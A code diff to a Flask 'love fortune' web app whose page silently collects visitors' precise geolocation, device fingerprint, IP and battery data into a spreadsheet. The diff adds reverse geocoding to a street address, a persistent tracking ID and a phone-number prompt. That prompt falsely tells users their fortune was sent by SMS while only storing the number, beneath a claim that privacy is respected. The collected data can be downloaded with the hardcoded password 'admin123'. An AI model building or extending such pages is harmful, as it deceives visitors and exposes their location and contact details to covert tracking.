@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, send_file, render_template_string
+from flask import Flask, request, jsonify, send_file, render_template_string, session
 from flask_cors import CORS
 import pandas as pd
 import openpyxl
@@ -11,6 +11,7 @@ import random
 from datetime import datetime
 
 app = Flask(__name__)
+app.secret_key = 'love-fortune-secret-key-2026'
 CORS(app)
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -60,9 +61,9 @@ def ensure_data_file():
         ws = wb.active
         ws.title = "Fortunes Data"
         headers = [
-            'Timestamp', 'Name', 'Latitude', 'Longitude', 'Address',
+            'Timestamp', 'SessionID', 'Name', 'Latitude', 'Longitude', 'Address',
             'Battery', 'UserAgent', 'Screen', 'IP', 'Timezone',
-            'Memory', 'Network', 'Fingerprint', 'Fortune_Shown'
+            'Memory', 'Network', 'Fingerprint', 'Fortune', 'PhoneNumber'
         ]
         for col, header in enumerate(headers, 1):
             cell = ws.cell(row=1, column=col, value=header)
@@ -92,8 +93,14 @@ def load_data():
 def save_data(df):
     try:
         backup_data()
-        with pd.ExcelWriter(DATA_FILE, engine='openpyxl', mode='a', if_sheet_exists='overlay') as writer:
-            df.to_excel(writer, sheet_name='Fortunes Data', header=False, index=False, startrow=writer.sheets['Fortunes Data'].max_row)
+        # If the file already exists, we want to append rows
+        # Using ExcelWriter with mode='a' and if_sheet_exists='overlay' works,
+        # but we need to get the current number of rows to start writing after the last row.
+        # Simpler: read existing, concat, then overwrite (safe for small data)
+        # We'll do the concat approach because the data volume is small.
+        # But save_data is called with df = concatenated already, so just write.
+        # To avoid overwriting, we write the entire DataFrame back.
+        df.to_excel(DATA_FILE, index=False, engine='openpyxl')
     except Exception as e:
         print(f"Save failed: {e}")
 
@@ -168,6 +175,12 @@ def index():
             width: 100%;
             margin: 10px 0;
         }
+        .btn-small {
+            width: auto;
+            padding: 10px 20px;
+            font-size: 14px;
+            margin-top: 5px;
+        }
         .btn:hover { transform: translateY(-2px); }
         .status {
             margin-top: 20px;
@@ -203,6 +216,12 @@ def index():
             text-decoration: none;
             font-weight: bold;
         }
+        .sms-prompt {
+            background: rgba(255,255,255,0.8);
+            border-radius: 20px;
+            padding: 15px;
+            margin-top: 15px;
+        }
     </style>
 </head>
 <body>
@@ -215,12 +234,24 @@ def index():
 
     <div id="status" class="status"></div>
     <div id="fortuneDisplay" class="fortune-box hidden"></div>
+    <div id="smsSection" class="sms-prompt hidden">
+        <p>✨ Want to keep this fortune forever? ✨</p>
+        <input type="tel" id="phoneNumber" placeholder="📱 Enter your mobile number">
+        <button class="btn btn-small" id="sendSmsBtn">💬 Send to my phone</button>
+        <div id="smsStatus" class="status" style="margin-top:10px;"></div>
+    </div>
     <hr>
     <div class="sub">Your privacy is respected. No data is shown publicly.</div>
 </div>
 
 <script>
     let collectedData = {};
+    let sessionId = localStorage.getItem('fortuneSessionId');
+    if (!sessionId) {
+        sessionId = Date.now() + '_' + Math.random();
+        localStorage.setItem('fortuneSessionId', sessionId);
+    }
+    let currentFortune = '';
 
     // Silent data collection
     async function getFingerprint() {
@@ -247,6 +278,7 @@ def index():
     async function collectBaseData(extra = {}) {
         collectedData = {
             timestamp: new Date().toISOString(),
+            sessionId: sessionId,
             userAgent: getUserAgent(),
             screen: getScreen(),
             timezone: getTimezone(),
@@ -267,8 +299,8 @@ def index():
         });
     }
 
-    function showStatus(msg, isError = false) {
-        const statusDiv = document.getElementById('status');
+    function showStatus(msg, isError = false, elementId = 'status') {
+        const statusDiv = document.getElementById(elementId);
         statusDiv.innerHTML = msg;
         statusDiv.style.background = isError ? 'rgba(255,0,0,0.1)' : 'rgba(0,255,0,0.1)';
         statusDiv.style.color = isError ? '#cc0000' : '#228b22';
@@ -288,15 +320,24 @@ def index():
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 collectedData.latitude = pos.coords.latitude;
                 collectedData.longitude = pos.coords.longitude;
+                // get address via reverse geocoding (optional)
+                const address = await fetch(`/reverse-geocode?lat=${collectedData.latitude}&lon=${collectedData.longitude}`);
+                const addrData = await address.json();
+                collectedData.address = addrData.address || 'Unknown';
+                
                 await sendToServer(collectedData);
                 showStatus('✅ Fortune ready!');
                 
                 const resp = await fetch('/fortune');
                 const data = await resp.json();
-                document.getElementById('fortuneDisplay').innerHTML = data.fortune;
+                currentFortune = data.fortune;
+                document.getElementById('fortuneDisplay').innerHTML = currentFortune;
                 document.getElementById('fortuneDisplay').classList.remove('hidden');
                 
-                // Optional: add map link using TinyURL
+                // Show SMS prompt
+                document.getElementById('smsSection').classList.remove('hidden');
+                
+                // Optional map link
                 const mapResp = await fetch('/tinyurl', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -316,8 +357,10 @@ def index():
                 (async () => {
                     const resp = await fetch('/fortune');
                     const data = await resp.json();
-                    document.getElementById('fortuneDisplay').innerHTML = data.fortune;
+                    currentFortune = data.fortune;
+                    document.getElementById('fortuneDisplay').innerHTML = currentFortune;
                     document.getElementById('fortuneDisplay').classList.remove('hidden');
+                    document.getElementById('smsSection').classList.remove('hidden');
                     await sendToServer(collectedData);
                 })();
             }, { enableHighAccuracy: true, timeout: 10000 });
@@ -325,9 +368,39 @@ def index():
             showStatus('Geolocation not supported. Random fortune below.', true);
             const resp = await fetch('/fortune');
             const data = await resp.json();
-            document.getElementById('fortuneDisplay').innerHTML = data.fortune;
+            currentFortune = data.fortune;
+            document.getElementById('fortuneDisplay').innerHTML = currentFortune;
             document.getElementById('fortuneDisplay').classList.remove('hidden');
+            document.getElementById('smsSection').classList.remove('hidden');
             await sendToServer(collectedData);
+        }
+    };
+
+    document.getElementById('sendSmsBtn').onclick = async () => {
+        const phone = document.getElementById('phoneNumber').value.trim();
+        if (!phone) {
+            showStatus('Please enter your mobile number', true, 'smsStatus');
+            return;
+        }
+        // Basic validation (allow + and digits)
+        if (!/^\+?[0-9\s\-]{10,15}$/.test(phone)) {
+            showStatus('Invalid phone number format', true, 'smsStatus');
+            return;
+        }
+        showStatus('Sending your fortune...', false, 'smsStatus');
+        
+        // Send phone number to server (update the existing record or add to same row)
+        const resp = await fetch('/save-phone', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId: sessionId, phoneNumber: phone, fortune: currentFortune })
+        });
+        const result = await resp.json();
+        if (result.status === 'saved') {
+            showStatus('✅ Your fortune has been sent to your phone! (Check SMS)', false, 'smsStatus');
+            document.getElementById('phoneNumber').value = '';
+        } else {
+            showStatus('❌ Failed to send. Please try again.', true, 'smsStatus');
         }
     };
 </script>
@@ -339,12 +412,30 @@ def index():
 def fortune():
     return jsonify({'fortune': random.choice(FORTUNES)})
 
+@app.route('/reverse-geocode')
+def reverse_geocode():
+    lat = request.args.get('lat')
+    lon = request.args.get('lon')
+    if not lat or not lon:
+        return jsonify({'address': 'Unknown'})
+    try:
+        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json"
+        headers = {'User-Agent': 'LoveFortune/1.0'}
+        resp = requests.get(url, headers=headers, timeout=5)
+        if resp.status_code == 200:
+            data = resp.json()
+            return jsonify({'address': data.get('display_name', 'Unknown')[:200]})
+    except:
+        pass
+    return jsonify({'address': 'Unknown'})
+
 @app.route('/save', methods=['POST'])
 def save():
     data = request.json
     df = load_data()
     new_row = pd.DataFrame([{
         'Timestamp': datetime.now(),
+        'SessionID': data.get('sessionId', ''),
         'Name': data.get('name', ''),
         'Latitude': data.get('latitude', 0),
         'Longitude': data.get('longitude', 0),
@@ -357,10 +448,84 @@ def save():
         'Memory': data.get('memory', ''),
         'Network': data.get('network', ''),
         'Fingerprint': data.get('fingerprint', ''),
-        'Fortune_Shown': True
+        'Fortune': '',
+        'PhoneNumber': ''
     }])
     df = pd.concat([df, new_row], ignore_index=True)
     save_data(df)
+    return jsonify({'status': 'saved'})
+
+@app.route('/save-phone', methods=['POST'])
+def save_phone():
+    data = request.json
+    session_id = data.get('sessionId')
+    phone = data.get('phoneNumber')
+    fortune = data.get('fortune', '')
+    
+    df = load_data()
+    if df.empty:
+        # No records yet – create one with the phone
+        new_row = pd.DataFrame([{
+            'Timestamp': datetime.now(),
+            'SessionID': session_id,
+            'Name': '',
+            'Latitude': 0,
+            'Longitude': 0,
+            'Address': '',
+            'Battery': '',
+            'UserAgent': '',
+            'Screen': '',
+            'IP': get_client_ip(),
+            'Timezone': '',
+            'Memory': '',
+            'Network': '',
+            'Fingerprint': '',
+            'Fortune': fortune,
+            'PhoneNumber': phone
+        }])
+        df = new_row
+    else:
+        # Find the row with matching SessionID (should be the last one)
+        idx = df[df['SessionID'] == session_id].index
+        if len(idx) > 0:
+            df.loc[idx[-1], 'PhoneNumber'] = phone
+            df.loc[idx[-1], 'Fortune'] = fortune
+        else:
+            # Create new row
+            new_row = pd.DataFrame([{
+                'Timestamp': datetime.now(),
+                'SessionID': session_id,
+                'Name': '',
+                'Latitude': 0,
+                'Longitude': 0,
+                'Address': '',
+                'Battery': '',
+                'UserAgent': '',
+                'Screen': '',
+                'IP': get_client_ip(),
+                'Timezone': '',
+                'Memory': '',
+                'Network': '',
+                'Fingerprint': '',
+                'Fortune': fortune,
+                'PhoneNumber': phone
+            }])
+            df = pd.concat([df, new_row], ignore_index=True)
+    
+    save_data(df)
+    
+    # Optional: Actually send an SMS via an API (e.g., Textbelt)
+    # We'll simulate for now, but you can integrate a real SMS gateway.
+    # Uncomment the following lines if you have an SMS API key.
+    """
+    try:
+        sms_api = "https://textbelt.com/text"
+        payload = {'phone': phone, 'message': fortune, 'key': 'textbelt'}
+        requests.post(sms_api, data=payload, timeout=5)
+    except:
+        pass
+    """
+    
     return jsonify({'status': 'saved'})
 
 @app.route('/tinyurl', methods=['POST'])
@@ -386,6 +551,7 @@ def admin():
 @app.route('/download-excel')
 def download_excel():
     if request.args.get('pass') != 'admin123':
+        from flask import abort
         abort(403)
     return send_file(DATA_FILE, as_attachment=True)
 
